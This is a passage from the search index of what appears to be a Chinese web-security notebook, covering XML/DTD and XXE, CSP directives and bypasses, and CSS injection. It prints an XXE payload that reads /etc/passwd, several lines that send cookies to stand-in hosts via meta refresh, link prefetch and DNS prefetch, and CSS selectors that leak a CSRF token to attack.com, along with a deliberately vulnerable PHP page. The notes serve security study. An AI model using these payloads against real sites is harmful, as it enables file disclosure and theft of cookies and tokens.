<p>\u8d85\u6587\u672c\u6807\u8bb0\u8bed\u8a00\u88ab\u8bbe\u8ba1\u7528\u6765\u663e\u793a\u6570\u636e\uff0c\u5176\u7126\u70b9\u662f\u6570\u636e\u7684\u5916\u89c2</p> <p>XML\u75313\u4e2a\u90e8\u5206\u6784\u6210\uff0c\u5b83\u4eec\u5206\u522b\u662f\uff1a\u6587\u6863\u7c7b\u578b\u5b9a\u4e49\uff08Document Type Definition\uff0cDTD\uff09\uff0c\u5373XML\u7684\u5e03\u5c40\u8bed\u8a00\uff1b\u53ef\u6269\u5c55\u7684\u6837\u5f0f\u8bed\u8a00\uff08Extensible Style Language\uff0cXSL\uff09\uff0c\u5373XML\u7684\u6837\u5f0f\u8868\u8bed\u8a00\uff1b\u4ee5\u53ca\u53ef\u6269\u5c55\u94fe\u63a5\u8bed\u8a00\uff08Extensible Link Language\uff0cXLL\uff09\u3002</p>"},{"location":"web/XML/xxe/#xml_1","title":"Xml\u683c\u5f0f","text":"<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n\n&lt;!-- \u2b06XML\u58f0\u660e\u2b06 --&gt;\n\n&lt;!DOCTYPE  \u6587\u4ef6\u540d [\n\n&lt;!ENTITY\u5b9e\u4f53\u540d \"\u5b9e\u4f53\u5185\u5bb9\"&gt;\n\n]&gt;\n\n&lt;!-- \u2b06\u6587\u6863\u7c7b\u578b\u5b9a\u4e49(DTD)\u2b06 --&gt;\n\n&lt;\u5143\u7d20\u540d\u79f0 category=\"\u5c5e\u6027\"&gt;\n\n\u6587\u672c\u6216\u5176\u4ed6\u5143\u7d20\n\n&lt;/\u5143\u7d20\u540d\u79f0&gt;\n\n&lt;!-- \u2b06\u6587\u6863\u5143\u7d20\u2b06 --&gt;\n</code></pre> <p>1\uff0c\u5143\u7d20  \u5143\u7d20\u662f XML \u4ee5\u53ca HTML \u6587\u6863\u7684\u4e3b\u8981\u6784\u5efa\u6a21\u5757\uff0c\u5143\u7d20\u53ef\u5305\u542b\u6587\u672c\u3001\u5176\u4ed6\u5143\u7d20\u6216\u8005\u662f\u7a7a\u7684\u3002  \u5b9e\u4f8b:</p> <pre><code>&lt;body&gt;body text in between&lt;/body&gt;\n&lt;message&gt;some message in between&lt;/message&gt;12\n</code></pre> <p>\u7a7a\u7684 HTML \u5143\u7d20\u7684\u4f8b\u5b50\u662f \"hr\"\u3001\"br\" \u4ee5\u53ca \"img\"\u3002</p> <p>2\uff0c\u5c5e\u6027  \u5c5e\u6027\u53ef\u63d0\u4f9b\u6709\u5173\u5143\u7d20\u7684\u989d\u5916\u4fe1\u606f  \u5b9e\u4f8b\uff1a</p> <pre><code>&lt;img src=\"computer.gif\" /&gt;1\n</code></pre> <p>3\uff0c\u5b9e\u4f53  \u5b9e\u4f53\u662f\u7528\u6765\u5b9a\u4e49\u666e\u901a\u6587\u672c\u7684\u53d8\u91cf\u3002\u5b9e\u4f53\u5f15\u7528\u662f\u5bf9\u5b9e\u4f53\u7684\u5f15\u7528\u3002</p> <p>4\uff0cPCDATA  PCDATA \u7684\u610f\u601d\u662f\u88ab\u89e3\u6790\u7684\u5b57\u7b26\u6570\u636e\uff08parsed character data\uff09\u3002  PCDATA \u662f\u4f1a\u88ab\u89e3\u6790\u5668\u89e3\u6790\u7684\u6587\u672c\u3002\u8fd9\u4e9b\u6587\u672c\u5c06\u88ab\u89e3\u6790\u5668\u68c0\u67e5\u5b9e\u4f53\u4ee5\u53ca\u6807\u8bb0\u3002</p> <p>5\uff0cCDATA  CDATA \u7684\u610f\u601d\u662f\u5b57\u7b26\u6570\u636e\uff08character data\uff09\u3002  CDATA \u662f\u4e0d\u4f1a\u88ab\u89e3\u6790\u5668\u89e3\u6790\u7684\u6587\u672c\u3002</p>"},{"location":"web/XML/xxe/#dtd","title":"DTD(\u6587\u6863\u7c7b\u578b\u5b9a\u4e49)","text":"<p>DTD\uff08\u6587\u6863\u7c7b\u578b\u5b9a\u4e49\uff09\u7684\u4f5c\u7528\u662f\u5b9a\u4e49 XML \u6587\u6863\u7684\u5408\u6cd5\u6784\u5efa\u6a21\u5757\u3002</p> <p>DTD \u53ef\u4ee5\u5728 XML \u6587\u6863\u5185\u58f0\u660e\uff0c\u4e5f\u53ef\u4ee5\u5916\u90e8\u5f15\u7528\u3002</p> <p>1\uff0c\u5185\u90e8\u58f0\u660e\uff1a&lt;!DOCTYPE \u6839\u5143\u7d20 [\u5143\u7d20\u58f0\u660e]&gt; ex: <code>&lt;!DOCTYOE test any&gt;</code>  \u5b8c\u6574\u5b9e\u4f8b\uff1a</p> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE note [\n  &lt;!ELEMENT note (to,from,heading,body)&gt;\n  &lt;!ELEMENT to      (#PCDATA)&gt;\n  &lt;!ELEMENT from    (#PCDATA)&gt;\n  &lt;!ELEMENT heading (#PCDATA)&gt;\n  &lt;!ELEMENT body    (#PCDATA)&gt;\n]&gt;\n&lt;note&gt;\n  &lt;to&gt;George&lt;/to&gt;\n  &lt;from&gt;John&lt;/from&gt;\n  &lt;heading&gt;Reminder&lt;/heading&gt;\n  &lt;body&gt;Don't forget the meeting!&lt;/body&gt;\n&lt;/note&gt;1234567891011121314\n</code></pre> <p>2\uff0c\u5916\u90e8\u58f0\u660e\uff08\u5f15\u7528\u5916\u90e8DTD\uff09\uff1a&lt;!DOCTYPE \u6839\u5143\u7d20 SYSTEM \"\u6587\u4ef6\u540d\"&gt; ex:<code>&lt;!DOCTYPE test SYSTEM 'http://www.test.com/evil.dtd'&gt;</code>  \u5b8c\u6574\u5b9e\u4f8b:</p> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE note SYSTEM \"note.dtd\"&gt;\n&lt;note&gt;\n&lt;to&gt;George&lt;/to&gt;\n&lt;from&gt;John&lt;/from&gt;\n&lt;heading&gt;Reminder&lt;/heading&gt;\n&lt;body&gt;Don't forget the meeting!&lt;/body&gt;\n&lt;/note&gt; 12345678\n</code></pre> <p>\u800cnote.dtd\u7684\u5185\u5bb9\u4e3a:</p> <pre><code>&lt;!ELEMENT note (to,from,heading,body)&gt;\n&lt;!ELEMENT to (#PCDATA)&gt;\n&lt;!ELEMENT from (#PCDATA)&gt;\n&lt;!ELEMENT heading (#PCDATA)&gt;\n&lt;!ELEMENT body (#PCDATA)&gt;12345\n</code></pre>"},{"location":"web/XML/xxe/#dtd_1","title":"DTD\u5b9e\u4f53","text":"<p>DTD\u5b9e\u4f53\u662f\u7528\u4e8e\u5b9a\u4e49\u5f15\u7528\u666e\u901a\u6587\u672c\u6216\u7279\u6b8a\u5b57\u7b26\u7684\u5feb\u6377\u65b9\u5f0f\u7684\u53d8\u91cf\uff0c\u53ef\u4ee5\u5185\u90e8\u58f0\u660e\u6216\u5916\u90e8\u5f15\u7528\u3002</p> <p>\u5b9e\u4f53\u53c8\u5206\u4e3a\u4e00\u822c\u5b9e\u4f53\u548c\u53c2\u6570\u5b9e\u4f53  1\uff0c\u4e00\u822c\u5b9e\u4f53\u7684\u58f0\u660e\u8bed\u6cd5:&lt;!ENTITY \u5b9e\u4f53\u540d \"\u5b9e\u4f53\u5185\u5bb9\u201c&gt;  \u5f15\u7528\u5b9e\u4f53\u7684\u65b9\u5f0f\uff1a&amp;\u5b9e\u4f53\u540d\uff1b  2\uff0c\u53c2\u6570\u5b9e\u4f53\u53ea\u80fd\u5728DTD\u4e2d\u4f7f\u7528\uff0c\u53c2\u6570\u5b9e\u4f53\u7684\u58f0\u660e\u683c\u5f0f\uff1a &lt;!ENTITY % \u5b9e\u4f53\u540d \"\u5b9e\u4f53\u5185\u5bb9\u201c&gt;  \u5f15\u7528\u5b9e\u4f53\u7684\u65b9\u5f0f\uff1a%\u5b9e\u4f53\u540d\uff1b *** </p> <p>1\uff0c\u5185\u90e8\u5b9e\u4f53\u58f0\u660e:&lt;!ENTITY \u5b9e\u4f53\u540d\u79f0 \"\u5b9e\u4f53\u7684\u503c\"&gt; ex:<code>&lt;!ENTITY eviltest \"eviltest\"&gt;</code>  \u5b8c\u6574\u5b9e\u4f8b:</p> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE test [\n&lt;!ENTITY writer \"Bill Gates\"&gt;\n&lt;!ENTITY copyright \"Copyright W3School.com.cn\"&gt;\n]&gt;\n123456\n</code></pre> <p>&amp;writer;\u00a9right;</p> <p>2\uff0c\u5916\u90e8\u5b9e\u4f53\u58f0\u660e:&lt;!ENTITY \u5b9e\u4f53\u540d\u79f0 SYSTEM \"URI\"&gt;  \u5b8c\u6574\u5b9e\u4f8b:</p> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE test [\n&lt;!ENTITY writer SYSTEM \"http://www.w3school.com.cn/dtd/entities.dtd\"&gt;\n&lt;!ENTITY copyright SYSTEM \"http://www.w3school.com.cn/dtd/entities.dtd\"&gt;\n]&gt;\n&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;\n</code></pre>"},{"location":"web/XML/xxe/#xxe_1","title":"xxe","text":"<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;!DOCTYPE nsfocus-sec [  \n&lt;!ELEMENT methodname ANY &gt;\n&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;\n&lt;methodcall&gt;\n&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;\n&lt;/methodcall&gt;\n</code></pre> <p>\uff08\u8fd9\u91cc\u6bd4\u8f83\u597d\u73a9\u7684\u662fTypora\u751a\u81f3\u4f1a\u89e3\u6790&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\uff09</p>"},{"location":"web/XSS_CSS_CSP/csp/CSP/","title":"CSP","text":"<p>\u5185\u5bb9\u5b89\u5168\u7b56\u7565\u6216CSP\u662f\u4e00\u79cd\u5185\u7f6e\u7684\u6d4f\u89c8\u5668\u5b89\u5168\u63aa\u65bd\uff0c\u7528\u4e8e\u9632\u5fa1\u8de8\u7ad9\u70b9\u811a\u672c\uff08XSS\uff09\u7b49Web\u653b\u51fb\u3002\u8be5\u7b56\u7565\u7684\u89c4\u5219\u7528\u4e8e\u5b9a\u4e49\u4e00\u7ec4\u6d4f\u89c8\u5668\u53ef\u4ee5\u5b89\u5168\u5730\u4ece\u4e2d\u52a0\u8f7d\u5185\u5bb9\u7684\u8def\u5f84\u548c\u6e90\uff0c\u5e76\u7ed9\u51fa\u76f8\u5e94\u7684\u63cf\u8ff0\u3002\u5176\u4e2d\uff0c\u8fd9\u4e9b\u8d44\u6e90\u5305\u62ec\u56fe\u50cf\u3001frame\u3001javascripts\u7b49\u3002</p> <p>\u4e00\u4e2aCSP\u5934\u7531\u591a\u7ec4CSP\u7b56\u7565\u7ec4\u6210\uff0c\u4e2d\u95f4\u7531\u5206\u53f7\u5206\u9694\uff0c\u5c31\u50cf\u8fd9\u6837\uff1a</p> <pre><code>Content-Security-Policy: default-src 'self' www.baidu.com; script-src 'unsafe-inline'\nPlain Text\n</code></pre> <p>\u5176\u4e2d\u6bcf\u4e00\u7ec4\u7b56\u7565\u5305\u542b\u4e00\u4e2a\u7b56\u7565\u6307\u4ee4\u548c\u4e00\u4e2a\u5185\u5bb9\u6e90\u5217\u8868</p> <p>\u4e00\u3001\u5e38\u7528\u7684\u7b56\u7565\u6307\u4ee4\uff1a</p>"},{"location":"web/XSS_CSS_CSP/csp/CSP/#default-src","title":"default-src","text":"<p>default-src \u6307\u4ee4\u5b9a\u4e49\u4e86\u90a3\u4e9b\u6ca1\u6709\u88ab\u66f4\u7cbe\u786e\u6307\u4ee4\u6307\u5b9a\u7684\u5b89\u5168\u7b56\u7565\u3002\u8fd9\u4e9b\u6307\u4ee4\u5305\u62ec\uff1a</p> <p>child-srcchild-src \u6307\u5b9a\u5b9a\u4e49\u4e86 web workers \u4ee5\u53ca\u5d4c\u5957\u7684\u6d4f\u89c8\u4e0a\u4e0b\u6587\uff08\u5982<code>&lt;frame&gt;</code>\u548c<code>&lt;iframe&gt;</code>\uff09\u7684\u6e90\u3002</p> <ul> <li> <p>connect-srcconnect-src\u5b9a\u4e49\u4e86\u8bf7\u6c42\u3001XMLHttpRequest\u3001WebSocket \u548c EventSource \u7684\u8fde\u63a5\u6765\u6e90\u3002</p> </li> <li> <p>font-srcfont-src\u5b9a\u4e49\u4e86\u5b57\u4f53\u52a0\u8f7d\u7684\u6709\u6548\u6765\u6e90</p> </li> <li> <p>img-srcimg-src\u5b9a\u4e49\u4e86\u9875\u9762\u4e2d\u56fe\u7247\u548c\u56fe\u6807\u7684\u6709\u6548\u6765\u6e90</p> </li> <li></li> <li>media-src</li> <li>object-src</li> </ul> <p>script-srcscript-src\u5b9a\u4e49\u4e86\u9875\u9762\u4e2dJavascript\u7684\u6709\u6548\u6765\u6e90</p> <ul> <li> <p>style-srcstyle-src\u5b9a\u4e49\u4e86\u9875\u9762\u4e2dCSS\u6837\u5f0f\u7684\u6709\u6548\u6765\u6e90</p> </li> <li></li> </ul>"},{"location":"web/XSS_CSS_CSP/csp/CSP/#_1","title":"\u4e8c\u3001\u5185\u5bb9\u6e90\uff1a","text":"<p>\u5185\u5bb9\u6e90\u6709\u4e09\u79cd\uff1a\u6e90\u5217\u8868\u3001\u5173\u952e\u5b57\u548c\u6570\u636e</p> <p>1\u3001\u6e90\u5217\u8868</p> <pre><code>\u6e90\u5217\u8868\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6307\u5b9a\u4e86\u4e00\u4e2a\u6216\u591a\u4e2a\u4e92\u8054\u7f51\u4e3b\u673a\uff08\u901a\u8fc7\u4e3b\u673a\u540d\u6216 IP \u5730\u5740\uff09\uff0c\u548c\u53ef\u9009\u7684\u6216\u7aef\u53e3\u53f7\u3002\u7ad9\u70b9\u5730\u5740\u53ef\u4ee5\u5305\u542b\u53ef\u9009\u7684\u901a\u914d\u7b26\u524d\u7f00 (\u661f\u53f7, '*')\uff0c\u7aef\u53e3\u53f7\u4e5f\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26 (\u540c\u6837\u662f '*') \u6765\u8868\u660e\u6240\u6709\u5408\u6cd5\u7aef\u53e3\u90fd\u662f\u6709\u6548\u6765\u6e90\u3002\u4e3b\u673a\u901a\u8fc7\u7a7a\u683c\u5206\u9694\u3002\u6709\u6548\u7684\u4e3b\u673a\u8868\u8fbe\u5f0f\u5305\u62ec\uff1a    http://*.foo.com \uff08\u5339\u914d\u6240\u6709\u4f7f\u7528 http\u534f\u8bae\u52a0\u8f7d foo.com \u4efb\u4f55\u5b50\u57df\u540d\u7684\u5c1d\u8bd5\u3002\uff09    mail.foo.com:443 \uff08\u5339\u914d\u6240\u6709\u8bbf\u95ee mail.foo.com \u7684 443 \u7aef\u53e3 \u7684\u5c1d\u8bd5\u3002\uff09    https://store.foo.com  \uff08\u5339\u914d\u6240\u6709\u4f7f\u7528 https\u534f\u8bae\u8bbf\u95ee store.foo.com \u7684\u5c1d\u8bd5\u3002\uff09\u5982\u679c\u7aef\u53e3\u53f7\u6ca1\u6709\u88ab\u6307\u5b9a\uff0c\u6d4f\u89c8\u5668\u4f1a\u4f7f\u7528\u6307\u5b9a\u534f\u8bae\u7684\u9ed8\u8ba4\u7aef\u53e3\u53f7\u3002\u5982\u679c\u534f\u8bae\u6ca1\u6709\u88ab\u6307\u5b9a\uff0c\u6d4f\u89c8\u5668\u4f1a\u4f7f\u7528\u8bbf\u95ee\u8be5\u6587\u6863\u65f6\u7684\u534f\u8bae\u3002\nPlain Text\n</code></pre> <p>2\u3001\u5173\u952e\u5b57</p> <p>\u2018none\u2019  \u4ee3\u8868\u7a7a\u96c6\uff1b\u5373\u4e0d\u5339\u914d\u4efb\u4f55 URL\u3002\u4e24\u4fa7\u5355\u5f15\u53f7\u662f\u5fc5\u987b\u7684\u3002</p> <ul> <li> <p>\u2018self\u2019  \u4ee3\u8868\u548c\u6587\u6863\u540c\u6e90\uff0c\u5305\u62ec\u76f8\u540c\u7684 URL \u534f\u8bae\u548c\u7aef\u53e3\u53f7\u3002\u4e24\u4fa7\u5355\u5f15\u53f7\u662f\u5fc5\u987b\u7684\u3002</p> </li> <li> <p>\u2018unsafe-inline\u2019  \u5141\u8bb8\u4f7f\u7528\u5185\u8054\u8d44\u6e90\uff0c\u5982\u5185\u8054\u7684</p> </li> <li></li> </ul>"},{"location":"web/XSS_CSS_CSP/csp/CSP/#3","title":"3\u3001\u6570\u636e","text":"<p>data:  \u5141\u8bb8data: URI\u4f5c\u4e3a\u5185\u5bb9\u6765\u6e90\u3002</p> <ul> <li>mediastream:  \u5141\u8bb8mediastream: URI\u4f5c\u4e3a\u5185\u5bb9\u6765\u6e90\u3002 Content-Security-Policy: default-src 'self'; img-src 'self' data:; media-src mediastream:</li> </ul>"},{"location":"web/XSS_CSS_CSP/csp/CSP/#csp_1","title":"CSP\u7ed5\u8fc7","text":"<p>\u548cXSS\u8fd8\u662f\u7ed1\u5b9a\u5728\u4e00\u8d77\uff0c\u6bd5\u7adf\u9700\u8981\u7ed5\u8fc7\u7684\u5c31\u662fXSS\u561b</p>"},{"location":"web/XSS_CSS_CSP/csp/CSP/#1url","title":"1\u3001url\u8df3\u8f6c","text":"<p>\u5728default-src \u2018none\u2019\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u4f7f\u7528meta\u6807\u7b7e\u5b9e\u73b0\u8df3\u8f6c</p> <pre><code>&lt;meta http-equiv=\"refresh\" content=\"1;url=http://www.xss.com/x.php?c=[cookie]\" &gt;\n1\nPlain Text\n</code></pre> <p>\u5728\u5141\u8bb8unsafe-inline\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u7528window.location\uff0c\u6216\u8005window.open\u4e4b\u7c7b\u7684\u65b9\u6cd5\u8fdb\u884c\u8df3\u8f6c\u7ed5\u8fc7\u3002</p> <pre><code>&lt;script&gt;  window.location=\"http://www.xss.com/x.php?c=[cookie]\";&lt;/script&gt;\n123\nPlain Text\n</code></pre>"},{"location":"web/XSS_CSS_CSP/csp/CSP/#2link-csplink","title":"2\u3001<code>&lt;link&gt;</code>\u6807\u7b7e\u9884\u52a0\u8f7d CSP\u5bf9link\u6807\u7b7e\u7684\u9884\u52a0\u8f7d\u529f\u80fd\u8003\u8651\u4e0d\u5b8c\u5584\u3002","text":"<p>\u5728Chrome\u4e0b\uff0c\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u6807\u7b7e\u53d1\u9001cookie</p> <pre><code>&lt;link rel=\"prefetch\" href=\"http://www.xss.com/x.php?c=[cookie]\"&gt;\n1\nPlain Text\n</code></pre> <p>\u5728Firefox\u4e0b\uff0c\u53ef\u4ee5\u5c06cookie\u4f5c\u4e3a\u5b50\u57df\u540d\uff0c\u7528dns\u9884\u89e3\u6790\u7684\u65b9\u5f0f\u628acookie\u5e26\u51fa\u53bb\uff0c\u67e5\u770bdns\u670d\u52a1\u5668\u7684\u65e5\u5fd7\u5c31\u80fd\u5f97\u5230cookie</p> <pre><code>&lt;link rel=\"dns-prefetch\" href=\"//[cookie].xxx.ceye.io\"&gt;\n1\nPlain Text\n</code></pre>"},{"location":"web/XSS_CSS_CSP/csp/CSP/#3_1","title":"3\u3001\u5229\u7528\u6d4f\u89c8\u5668\u8865\u5168","text":"<p>\u6709\u4e9b\u7f51\u7ad9\u9650\u5236\u53ea\u6709\u67d0\u4e9b\u811a\u672c\u624d\u80fd\u4f7f\u7528\uff0c\u5f80\u5f80\u4f1a\u4f7f\u7528<code>&lt;script&gt;</code>\u6807\u7b7e\u7684nonce\u5c5e\u6027\uff0c\u53ea\u6709nonce\u4e00\u81f4\u7684\u811a\u672c\u624d\u751f\u6548\uff0c\u6bd4\u5982CSP\u8bbe\u7f6e\u6210\u4e0b\u9762\u8fd9\u6837\uff1a</p> <pre><code>Content-Security-Policy: default-src 'none';script-src 'nonce-abc'\n1\nPlain Text\n</code></pre> <p>\u90a3\u4e48\u5f53\u811a\u672c\u63d2\u5165\u70b9\u4e3a\u5982\u4e0b\u7684\u60c5\u51b5\u65f6</p> <pre><code>&lt;p&gt;\u63d2\u5165\u70b9&lt;/p&gt;    &lt;script id=\"aa\" nonce=\"abc\"&gt;document.write('CSP');&lt;/script&gt;\n12\nPlain Text\n</code></pre> <p>\u8fd9\u6837\u4f1a\u62fc\u6210\u4e00\u4e2a\u65b0\u7684script\u6807\u7b7e\uff0c\u5176\u4e2d\u7684src\u53ef\u4ee5\u81ea\u7531\u8bbe\u5b9a</p> <pre><code>&lt;p&gt;&lt;script src=//14.rs a=\"&lt;/p&gt;    &lt;script id=\"aa\" nonce=\"abc\"&gt;document.write('CSP');&lt;/script&gt;\nPlain Text\n</code></pre>"},{"location":"web/XSS_CSS_CSP/css/CSS%E6%B3%A8%E5%85%A5/","title":"CSS\u6ce8\u5165","text":"<p>\u8fd9\u5757\u6211\u662f\u4e0d\u592a\u4f1a\u7684\u56e0\u6b64\uff1a\uff08\u6697\u793a\u767d\u5ad6\uff09</p> <p>\u5c42\u53e0\u6837\u5f0f\u8868(\u82f1\u6587\u5168\u79f0\uff1aCascading Style Sheets)\u662f\u4e00\u79cd\u7528\u6765\u8868\u73b0HTML\uff08\u6807\u51c6\u901a\u7528\u6807\u8bb0\u8bed\u8a00\u7684\u4e00\u4e2a\u5e94\u7528\uff09\u6216XML\uff08\u6807\u51c6\u901a\u7528\u6807\u8bb0\u8bed\u8a00\u7684\u4e00\u4e2a\u5b50\u96c6\uff09\u7b49\u6587\u4ef6\u6837\u5f0f\u7684\u8ba1\u7b97\u673a\u8bed\u8a00\u3002CSS\u4e0d\u4ec5\u53ef\u4ee5\u9759\u6001\u5730\u4fee\u9970\u7f51\u9875\uff0c\u8fd8\u53ef\u4ee5\u914d\u5408\u5404\u79cd\u811a\u672c\u8bed\u8a00\u52a8\u6001\u5730\u5bf9\u7f51\u9875\u5404\u5143\u7d20\u8fdb\u884c\u683c\u5f0f\u5316\u3002</p> <p>CSS \u80fd\u591f\u5bf9\u7f51\u9875\u4e2d\u5143\u7d20\u4f4d\u7f6e\u7684\u6392\u7248\u8fdb\u884c\u50cf\u7d20\u7ea7\u7cbe\u786e\u63a7\u5236\uff0c\u652f\u6301\u51e0\u4e4e\u6240\u6709\u7684\u5b57\u4f53\u5b57\u53f7\u6837\u5f0f\uff0c\u62e5\u6709\u5bf9\u7f51\u9875\u5bf9\u8c61\u548c\u6a21\u578b\u6837\u5f0f\u7f16\u8f91\u7684\u80fd\u529b\u3002</p> <p>\u603b\u800c\u8a00\u4e4b\u5c31\u662f\u7f8e\u5316\u7f51\u7ad9\u7684\u3002</p> <p>\u73b0\u4ee3\u6d4f\u89c8\u5668\u90fd\u5df2\u4e0d\u5141\u8bb8\u5728CSS\u4e2d\u6267\u884cJavaScript\u4e86\uff0c\u4ee5\u524d\u7684CSS\u6ce8\u5165\u53ef\u4ee5\u5229\u7528JavaScript\u534f\u8bae\u5728<code>url()</code>\u3001<code>expression()</code>\u4e2d\u6267\u884cJavascript\u4ee3\u7801\u4ece\u800c\u5b9e\u73b0XSS\u3002\u4f46\u662f\u76ee\u524dCSS\u6ce8\u5165\u5728\u7a83\u53d6\u6570\u636e\u65b9\u9762\u4ecd\u7136\u662f\u975e\u5e38\u6709\u7528\u7684\uff0c\u4e0b\u9762\u5206\u522b\u6765\u5206\u6790\u4e00\u4e0b\u3002</p>"},{"location":"web/XSS_CSS_CSP/css/CSS%E6%B3%A8%E5%85%A5/#_1","title":"\u7a83\u53d6\u6807\u7b7e\u5c5e\u6027\u6570\u636e","text":"<p>CSS\u4e2d\u53ef\u4ee5\u4f7f\u7528\u5c5e\u6027\u9009\u62e9\u5668\uff0c\u6839\u636e\u4e0d\u540c\u7684\u5c5e\u6027\u9009\u62e9\u6807\u7b7e\u3002\u6bd4\u5982\u4e0b\u9762CSS\u9009\u62e9\u542b\u6709a\u5c5e\u6027\u4e14\u5176\u503c\u4e3aabc\u7684p\u6807\u7b7e\u3002</p> <pre><code>&lt;style&gt;p[a=\"abc\"]{ color: red;}&lt;/style&gt;\n &lt;p a=\"abc\"&gt;hello world&lt;/p&gt;\nPlain Text\n</code></pre> <p>\u5c5e\u6027\u9009\u62e9\u5668\u8fd8\u53ef\u4ee5\u5339\u914d\u503c\u7684\u4e00\u4e9b\u7279\u6027\uff0c\u6bd4\u5982\u4ee5XXX\u5f00\u5934\u3001\u4ee5XXX\u7ed3\u5c3e\u7b49\u3002</p> <p></p> <p>\u5229\u7528\u4e0a\u9762\u7684\u6027\u8d28\u6211\u4eec\u53ef\u4ee5\u7528\u6765\u7a83\u53d6\u9875\u9762\u6807\u7b7e\u5c5e\u6027\u4e2d\u7684\u6570\u636e\u3002\u6bd4\u5982\u4e0b\u9762\u5f53csrfToken\u4ee5\u67d0\u4e2a\u5b57\u6bcd\u5f00\u5934\u65f6\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7url()\u901a\u77e5\u653b\u51fb\u8005\uff0c\u4ece\u800c\u7a83\u53d6csrfToken\u7684\u7b2c\u4e00\u4f4d\u7684\u503c\u3002</p> <pre><code>&lt;style&gt;input[value^=\"0\"] {    background: url(http://attack.com/0);}input[value^=\"1\"] {    background: url(http://attack.com/1);}input[value^=\"2\"] {    background: url(http://attack.com/2);}...input[value^=\"Y\"] {    background: url(http://attack.com/Y);}input[value^=\"Z\"] {    background: url(http://attack.com/Z);}&lt;/style&gt;&lt;input  name=\"csrfToken\" value=\"ZTU1MzE1YjRiZGQMRmNjYwMTAzYjk4YjhjNGI0ZA==\"&gt;\nPlain Text\n</code></pre> <p>\u7b2c\u4e00\u4f4d\u662fZ\uff0c\u63a5\u7740\u7a83\u53d6\u7b2c\u4e8c\u4f4d</p> <pre><code>&lt;style&gt;input[value^=\"Z0\"] {    background: url(http://attack.com/0);}...input[value^=\"ZZ\"] {    background: url(http://attack.com/Z);}&lt;/style&gt;&lt;input  name=\"csrfToken\" value=\"ZTU1MzE1YjRiZGQMRmNjYwMTAzYjk4YjhjNGI0ZA==\"&gt;\nPlain Text\n</code></pre> <p>\u89e3\u51b3hidden</p> <p>\u5f53\u7136\u8fd8\u6709\u4e2a\u95ee\u9898\uff0c \u5f53\u6807\u7b7e<code>type=hidden</code>\u65f6\u6d4f\u89c8\u5668\u662f\u4e0d\u5141\u8bb8\u6211\u4eec\u8bbe\u7f6ebackground\u7684\uff0c\u8fd9\u6837\u5c31\u65e0\u6cd5\u89e6\u53d1<code>url()</code>\u8bf7\u6c42\u670d\u52a1\u5668\u3002\u89e3\u51b3\u65b9\u6cd5\u4e4b\u4e00\u662f\u5229\u7528<code>~</code>CSS\u7684\u5144\u5f1f\u9009\u62e9\u5668\uff0c\u9009\u62e9\u4e3a\u540e\u7eed\u6240\u6709\u5144\u5f1f\u8282\u70b9\u8bbe\u7f6ebackground\u3002</p> <pre><code>input[value^=\"Z\"] ~*{    background: url(http://attack.com/Z);}\nPlain Text\n</code></pre>"},{"location":"web/XSS_CSS_CSP/css/CSS%E6%B3%A8%E5%85%A5/#_2","title":"\u6279\u91cf\u5b9e\u73b0","text":"<p>\u5f53\u7136\uff0c\u5982\u679c\u4f4d\u6570\u6bd4\u8f83\u77ed\u4e14\u53ef\u80fd\u6027\u6bd4\u8f83\u5c11\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u6240\u6709\u90fd\u5217\u51fa\u6765\uff0c\u4f46\u662f\u901a\u5e38\u90fd\u592a\u591a\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5229\u7528\u6280\u5de7\u6279\u91cf\u5f97\u5230\u3002</p> <p>\u5047\u8bbe\u76ee\u6807\u5b58\u5728css\u6ce8\u5165\u7684\u7f51\u7ad9\u4e3a\u5982\u4e0b\uff0c \u76ee\u6807\u662f\u7a83\u53d6input\u6807\u7b7e\u4e2d\u7684csrfToken\u503c\u3002</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;CSS injection&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;input type=hidden name=\"csrfToken\" value=&lt;?=md5(date(\"h\"))?&gt;&gt;\n&lt;input type=\"\" name=\"\"&gt;\n&lt;style&gt;&lt;?php echo $_GET['css']?&gt;&lt;/style&gt;\n&lt;/body&gt;\n&lt;/html&gt;\nPlain Text\n</code></pre> <p>\u6709iframe</p> <p>\u5f53\u5b58\u5728CSS\u6ce8\u5165\u7684\u7f51\u7ad9\u54cd\u5e94\u5934\u672a\u88ab<code>X-Frame-Options</code>\u4fdd\u62a4\u65f6\uff0c \u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u6076\u610f\u7684\u9875\u9762\uff0c\u5229\u7528js\u521b\u5efaiframe\u5305\u542b\u8be5\u6f0f\u6d1e\u7f51\u7ad9\uff0c\u5229\u7528css\u6ce8\u5165\u83b7\u5f97\u4e00\u4f4dcsrfToken\u503c\u540e\u901a\u8fc7<code>url()</code>\u63d0\u4ea4\u7ed9\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u6307\u793a\u524d\u7aefjs\u7ee7\u7eed\u521b\u5efaiframe\u7a83\u53d6\u7b2c\u4e8c\u4f4d\u503c\uff0c\u7ee7\u7eed\u4e0a\u9762\u7684\u64cd\u4f5c\uff0c\u76f4\u5230\u5168\u90e8\u8bfb\u53d6\u5b8c\u3002\u5f53\u7136\u8fd9\u8981\u6c42\u6bcf\u6b21\u8bf7\u6c42\u6f0f\u6d1e\u7f51\u7ad9\u5185\u5bb9\u90fd\u4e0d\u4f1a\u53d8\u3002</p> 